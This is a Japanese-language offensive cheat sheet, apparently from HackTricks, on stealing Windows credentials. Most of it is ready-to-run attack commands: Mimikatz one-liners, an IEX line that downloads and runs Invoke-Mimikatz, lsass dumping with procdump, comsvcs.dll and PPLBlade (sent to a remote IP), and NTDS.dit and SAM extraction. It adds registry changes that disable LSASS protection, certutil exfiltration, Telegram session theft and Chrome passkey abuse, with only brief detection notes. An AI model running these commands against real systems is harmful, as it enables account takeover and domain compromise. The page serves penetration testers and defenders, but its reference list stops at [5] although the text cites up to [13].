# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatzができるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認できます。**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**考えられる認証情報の保護策についてはこちらをご覧ください。**](credentials-protections.md) **これらの保護策により、Mimikatzが一部の認証情報を抽出できなくなる可能性があります。**

## Meterpreterでの認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)**を使って**、被害者のシステム内にある**パスワードとハッシュを検索**します。

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AVの回避

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**のProcdumpは正規のMicrosoftツール**なので、Defenderには検知されません。\
このツールを使って**lsassプロセスをdump**し、**dumpをダウンロード**して、dumpから**認証情報をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump)も使用できます。

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) で自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の**AV**は、**procdump.exe を使用して lsass.exe を dump することを**悪意のある行為として**検知**する場合があります。これは、文字列 **"procdump.exe" と "lsass.exe"** を**検知**しているためです。そのため、**lsass.exe という名前の代わりに**、lsass.exe の **PID** を **引数**として procdump に渡す方が、より**ステルス性が高く**なります。

### **comsvcs.dll** を使った lsass の Dumping

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリを dump する**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の2つの引数は使用されませんが、3つ目の引数は3つの要素に分かれています。dump 対象のプロセス ID が1つ目の要素、dump ファイルの保存先が2つ目の要素、3つ目の要素は **full** という単語に固定されています。ほかのオプションはありません。\
これら3つの要素が解析されると、DLL は dump ファイルを作成し、指定されたプロセスのメモリをそのファイルに書き込みます。\
**comsvcs.dll** を使って lsass プロセスを dump できるため、procdump をアップロードして実行する必要はありません。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>

実行には次のコマンドを使用します。

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerでlsassをダンプする**

1. Task Barを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」を探します
4. 「Local Security Authority Process」を右クリックし、「Create dump file」をクリックします

### procdumpでlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートに含まれるMicrosoft署名済みバイナリです。

既存のシステム全体のクラッシュダンプや、アクセス可能なユーザーフォルダー内の圧縮コピーには、オフライン分析用の認証情報が残っている場合があります。`MEMORY.DMP`や`MEMORY.7z`のようなファイル名は、確認対象の手がかりにすぎません。出所とアクセス権を確認し、利用可能または最新の認証情報が含まれていると決めつけないでください。

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade を使った LSASS のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護の回避
2. Defender のシグネチャベースの検出を回避するためのメモリダンプファイルの難読化
3. RAW および SMB のアップロード方式を使って、ディスクに保存せずにメモリダンプをアップロードする（ファイルレスダンプ）

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump を使わない SSP ベースの LSASS ダンプ

Ink Dragon は **LalsDumper** と呼ばれる3段階の dumper を使用します。この dumper は `MiniDumpWriteDump` を一切呼び出さないため、この API に対する EDR hook は発動しません:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` 内から小文字の `d` 32文字で構成される placeholder を検索し、`rtu.txt` の絶対パスで上書きします。パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより、悪意のある DLL が新しい Security Support Provider (SSP) として **LSASS** に読み込まれます。
2. **LSASS 内の Stage 2** – LSASS が `nfdp.dll` を読み込むと、DLL は `rtu.txt` を読み込み、各バイトを `0x20` と XOR し、デコードした blob をメモリにマップしてから実行を引き渡します。
3. **Stage 3 dumper** – マップされた payload は、ハッシュ化された API 名から解決した **direct syscalls** を使って MiniDump のロジックを再実装します (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)。`Tom` という専用 export は `%TEMP%\<pid>.ddt` を開き、圧縮した LSASS dump をファイルに書き込み、ハンドルを閉じます。これにより、後から exfiltration を実行できます。

オペレーター向けメモ:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt` は同じディレクトリに置いてください。Stage 1 はハードコードされた placeholder を `rtu.txt` の絶対パスで書き換えるため、ファイルを分けると chain が機能しません。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加して行います。この値を自分で設定すれば、起動のたびに LSASS が SSP を再読み込みするようにできます。
* `%TEMP%\*.ddt` ファイルは圧縮された dump です。ローカルで解凍してから、Mimikatz/Volatility に渡して credential extraction を行います。
* `lals.exe` の実行には admin/SeTcb 権限が必要です。これにより `AddSecurityPackageA` が成功します。呼び出しが戻ると、LSASS は rogue SSP を透過的に読み込み、Stage 2 を実行します。
* ディスクから DLL を削除しても、LSASS からは削除されません。レジストリ エントリを削除して LSASS を再起動する（再起動する）か、長期 persistence のために残しておいてください。

## CrackMapExec

### SAM hashをダンプする

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 対象DCからNTDS.ditをDumpする

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### ターゲット DC から NTDS.dit のパスワード履歴をダンプする

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### NTDS.dit の各アカウントの pwdLastSet 属性を表示する

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**配置**されています。ただし、保護されているため、通常の方法でコピーすることはできません。

### レジストリから

これらのファイルを窃取する最も簡単な方法は、レジストリからコピーを取得することです。

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

それらのファイルをKaliマシンに**ダウンロード**し、**ハッシュを抽出**するには、次を使用します:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### ボリューム シャドウ コピー

このサービスを使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### vssadmin を使用する

vssadmin バイナリは Windows Server バージョンでのみ使用できます。

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

ただし、**Powershell**から同じことができます。これは**SAM fileをコピーする方法**の例です（使用するハードドライブは「C:」で、C:\users\Publicに保存します）。保護されたファイルなら何でもコピーできます。

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使って、SAM、SYSTEM、ntds.ditのコピーを作成することもできます。

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザー オブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメイン ユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースには、主に次の3つのテーブルがあります。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細情報を保存します。
- **Link Table**: グループのメンバーシップなど、オブジェクト間の関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

Christoffer Andersson によるデータベース層の研究では、これらのテーブルとバージョンごとの動作について、さらに詳しく解説されています。<sup>[[8]](#references)</sup>

Windows は _Ntdsa.dll_ を使ってこのファイルとやり取りし、このファイルは _lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** メモリ内に存在する可能性があります（**cache** を使用したパフォーマンス向上のため、最近アクセスされたデータが含まれている可能性があります）。

#### NTDS.dit 内のハッシュを復号する

ハッシュは3段階で復号されます。

1. **BOOTKEY** と **RC4** を使って Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使って **hash** を復号する。
3. **DES** を使って **hash** を復号する。

**PEK** はすべてのドメイン コントローラーで**同じ値**ですが、各ドメイン コントローラーの **SYSTEM** hive に含まれる、その DC 固有の **BOOTKEY** を使って **NTDS.dit** 内で**暗号化**されています。したがって、credentials を抽出するには **NTDS.dit** と **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) の両方が必要です。

### Ntdsutil を使って NTDS.dit をコピーする

Windows Server 2008 以降で利用できます。

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](#stealing-sam-and-system) の手法を使って、**ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM file** のコピーも必要です（同様に、[**レジストリからダンプするか、volume shadow copy の手法を使ってください**](#stealing-sam-and-system)）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** ファイルと **SYSTEM** ファイルを**入手したら**、_secretsdump.py_ などのツールを使って**ハッシュを抽出**できます。

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

有効なドメイン管理者ユーザーを使って、自動的に**抽出する**こともできます。

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**大きな NTDS.dit ファイル**は、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使って抽出することをおすすめします。

最後に、**metasploit module** `post/windows/gather/credentials/domain_hashdump` または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメインオブジェクトを抽出して SQLite データベースに保存する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使うと、NTDS オブジェクトを SQLite データベースに抽出できます。秘密情報だけでなく、オブジェクト全体とその属性も抽出されるため、NTDS.dit ファイルをすでに取得している場合は、さらに情報を抽出できます。

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive は必須ではありませんが、秘密情報の復号に使用できます（NT および LM hashes、cleartext passwords などの supplemental credentials、Kerberos または trust keys、NT および LM password histories）。その他の情報とともに、次のデータが抽出されます：ユーザーおよびマシンアカウントとその hashes、UAC flags、最終ログオンおよびパスワード変更の timestamp、アカウントの説明、名前、UPN、SPN、groups と再帰的な memberships、organizational units のツリーと memberships、trust の種類、方向、属性を含む trusted domains...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary をダウンロードしてください。この binary を使用すると、複数のソフトウェアから credentials を抽出できます。

```
lazagne.exe all
```

## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールを使うと、メモリから認証情報を抽出できます。以下からダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出します.

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAMファイルから認証情報を抽出する

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

[http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) からダウンロードして、**実行するだけ**でパスワードが抽出されます。

## アイドル状態の RDP セッションの調査とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には `DumpRDPHistory` tasker が含まれており、その手法はあらゆる red-teamer に役立ちます:<sup>[[3]](#references)</sup>

### DumpRDPHistory 形式のテレメトリ収集

* **アウトバウンド RDP ターゲット** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべてのユーザーハイブを解析します。各サブキーにはサーバー名、`UsernameHint`、最終書き込みタイムスタンプが保存されています。PowerShell を使って FinalDraft のロジックを再現できます。

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Inbound RDP の証拠** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログを検索し、イベント ID **21**（ログオン成功）および **25**（切断）から、誰がそのマシンを管理していたかを特定します。

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

どの Domain Admin が定期的に接続しているか把握したら、その**切断済み**セッションがまだ存在する間に、LalsDumper/Mimikatz で LSASS をダンプします。CredSSP + NTLM fallback により、そのユーザーの verifier と tokens が LSASS に残るため、それらを SMB/WinRM 経由で再利用して `NTDS.dit` を取得したり、domain controller に persistence を仕掛けたりできます。

### FinalDraft が標的とする Registry downgrade

同じ implant は、credential theft を容易にするため、複数の registry key にも改ざんを加えます:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` を設定すると、RDP 中の完全な credential/ticket 再利用が強制され、pass-the-hash 形式のピボットが可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効にするため、ローカル管理者はネットワーク経由で制限のない token を取得します。
* `DSRMAdminLogonBehavior=2` により、DC がオンラインの間に DSRM administrator がログオンできるようになり、攻撃者にもう一つの組み込みの高権限アカウントを与えます。
* `RunAsPPL=0` は LSASS PPL の保護を解除するため、LalsDumper などの dumper によるメモリーアクセスが容易になります。

## hMailServer の設定 credential（侵害後）

インストール構成に応じて、`C:\Program Files\hMailServer\Bin\hMailServer.ini`、`C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`、`C:\ProgramData\hMailServer\hMailServer.ini` の正確な設定ファイルを確認してください。読み取り可能で空でない `[Security] AdministratorPassword=` の値は hMailServer の管理者パスワードハッシュであり、Windows Administrator のパスワードを示すものではありません。この credential を回収できた場合でも、Windows アカウントへのピボットには、パスワードの再利用とログオン権限を別途確認する必要があります。

SQL CE データベースを使用するインストールでは、INI 内の別の `[Database] Password=` 値がデータベースを保護します。旧バージョンのインストールでは、この値は静的キー `THIS_KEY_IS_NOT_SECRET` と 4 バイト単位のエンディアン変換を使って Blowfish で暗号化されています。以下の Python snippet では、INI 内の hex string を使用します。<sup>[[2]](#references)</sup>

まず、現在のアカウントが INI と対応する SQL CE `.sdf` データベースの**両方**を読み取れることを確認してください。INI のパスワードはデータベースを保護するものであり、データベース内に保存されている mailbox アカウントのハッシュとは別のものです。使用中のデータベースを調査またはアップグレードする際は、必ずその**コピー**を使用し、稼働中のファイルは使用しないでください。

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

平文パスワードを使ってファイルロックを避けるために SQL CE データベースをコピーし、32-bit provider を読み込み、必要に応じてアップグレードしてからハッシュを照会します。

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` 列では hMailServer の hash format（hashcat mode `1421`）が使用されています。解読されたメールボックスの password が Windows user pivot になるのは、その password がローカルまたはドメインのアカウントでも再利用されており、そのアカウントに必要なリモートログオン権限がある場合に限られます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA logon callback `LsaApLogonUserEx2` を intercept することで**plaintext のログオン password**を取得します。認証 package callback を hook またはラップし、credentials を**ログオン中**（hash 化される前）に取得してから、ディスクに書き込むかオペレーターに返すという仕組みです。一般的には、LSA に inject または登録する helper として実装され、成功した対話型またはネットワークの各ログオンイベントについて、username、domain、password を記録します。<sup>[[1]](#references)</sup>

運用上の注意:
- 認証経路に helper をロードするには、ローカル admin または SYSTEM 権限が必要です。
- 取得される credentials は、ログオンが発生した場合にのみ確認できます（hook に応じて、対話型、RDP、service、またはネットワークログオン）。

## SSMS の保存済み接続 credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、保存済みの接続情報をユーザーごとの `sqlstudio.bin` ファイルに格納します。専用の dumper を使うと、ファイルを解析して保存済みの SQL credentials を復元できます。コマンド出力しか返さない shell では、ファイルを Base64 にエンコードして stdout に出力し、exfiltrate することがよくあります。<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

オペレーター側でファイルを再ビルドし、ローカルでdumperを実行して認証情報を復元します。

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Telegram Desktop `tdata` セッション窃取

Telegram Desktop は、認証情報とアカウント状態を **`tdata`** ディレクトリに保持します。コピーしたセッションは、認証が有効な間、互換性のあるツールで読み込むことで、アカウントのパスワードなしに認証できます。ローカルデータの暗号化が有効な場合、stealer にはパスコードも必要です。認証済みセッションからは、ID情報、ダイアログやメンバーシップのメタデータ、メッセージ、ダウンロード可能なメディアにアクセスできます。<sup>[[10]](#references)</sup>

### 検出と取得

インストール版とポータブル版の両方の配置場所を検索してください。Microsoft Store のパッケージ名は異なるため、`TelegramMessenge` を含むパッケージディレクトリを列挙し、その `LocalCache\Roaming` サブツリーを調べます。<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

通常の読み取りに失敗し、プロセストークンに `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合、バックアップ対応アクセスが代替手段になります。この方法で特権を取得したり、プロセスを昇格させたりすることはできません。必要なトークン特権が存在すれば、`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` でバックアップ／復元セマンティクスを要求し、ファイルのセキュリティチェックを回避できます。ただし、このフラグだけでは、互換性のない共有ロックを回避できません。<sup>[[10]](#references)[[11]](#references)</sup>

使用中でロックされたファイルには **Volume Shadow Copy** を作成して読み取ります。ACLによってアクセスがブロックされたファイルには、`robocopy /B` がバックアップモードを使用し、ファイルおよびディレクトリのACLを回避します。<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

帯域幅を意識した implant は、まずファイルパスの一覧だけを送信し、C2 に保存済みのパスとスナップショット識別子を受け取り、不足しているファイルだけをアップロードすることがあります。そのため、再帰的な `tdata` の列挙後に少量の差分転送が行われていても、セッション窃取が成功している可能性があります。<sup>[[10]](#references)</sup>

### 検知と封じ込め

Telegram 以外のプロセスによる `tdata` への再帰的なアクセスを、`SeBackupPrivilege` の有効化、backup-semantics を使ったファイルオープン、VSS のアクティビティ、または `/B` を指定して `robocopy.exe` を起動する子プロセスと関連付けて調査します。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方を短時間で列挙した後、同じプロセスから外部接続が行われていないかも調べます。侵害後は、**設定 → デバイス**（または **プライバシーとセキュリティ → アクティブなセッション**）から、見覚えのないセッションを終了します。2 段階認証を有効にするだけでは、すでに盗まれた認証を無効化できません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows 上の Chrome からの Passkeys / WebAuthn 認証情報窃取

**被害ユーザー**として、**Chrome + Google Password Manager で同期された passkeys** を使用する Windows ホストでコード実行を取得した場合、**admin/SYSTEM 権限がなくても**、passkeys は興味深い post-exploitation の標的になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** には、protobufでエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されています。同一ユーザーのプロセスは、同期されたpasskeyの **RP ID**、**ユーザー名**、**credential ID**、暗号化された秘密鍵のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期されたcredentialの復元に使われるラップ済みシークレットなど、ローカルのデバイス登録状態が保存されています。<sup>[[4]](#references)</sup>

簡易トリアージ:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPMにバインドされたkey blobもローカル署名オラクルとして悪用できる

ブラウザーがTPM-backed identity keyを**`NCRYPT_OPAQUE_KEY_BLOB`**としてエクスポートし、そのblobをユーザーがアクセス可能な領域に保存している場合、マルウェアはraw private keyを抽出する必要はありません。同じマシン上でblobを再インポートし、攻撃者が制御するデータへの署名をローカルTPMに要求するだけです:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

This means **hardware binding prevents off-device export, but not use by the same user on the compromised endpoint**.

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
   - passkey login を開始し、新しい WebAuthn challenge を取得する。
   - 盗んだ `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
   - 返された assertion を relying party に中継する。
   - RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否しない場合に特に有効。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` operation を送信して、再オンボーディングを強制する。
   - オンボーディング後もデバイスが **`uv_key_pending`** 状態の場合、攻撃者が管理する UV public key を登録する。
   - provider が新しい UV key の attestation / secure-hardware origin を検証しない場合、その後の攻撃者の鍵による署名は **`UV=1`** として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chrome に synced-passkey master secret を取得させるため、recovery または rejoin を強制する。
   - `passkey_enclave_state` の再作成や変更を監視し、平文の **security domain secret (SDS)** がメモリ上に存在する間に Chrome のメモリをダンプする。
   - 復元した SDS を使って、すべての `WebauthnCredentialSpecifics` record の暗号化フィールドを復号し、持ち運び可能な WebAuthn private key を復元する。

### DFIR / detection ideas

- `passkey_enclave_state` の**削除・再作成**を監視する。<sup>[[4]](#references)</sup>
- ブラウザー以外のプロセスによる Chrome の **`Sync Data\LevelDB`** への異常なアクセスを検知する。
- **Chrome のメモリダンプ**や、不審なプロセス間メモリアクセスを検知する。
- **Google Password Manager recovery PIN** の繰り返し表示や、予期しない再オンボーディングを調査する。
- WebAuthn の **`signCount`** は、synced passkey では一定のままの場合があり、役に立たないことが多い。そのため、従来型の clone detection は効果が弱い。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、長年検知されなかった作戦の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon の内側: リレーネットワークとステルス性の高い攻撃作戦の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: パスワードレス認証における新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
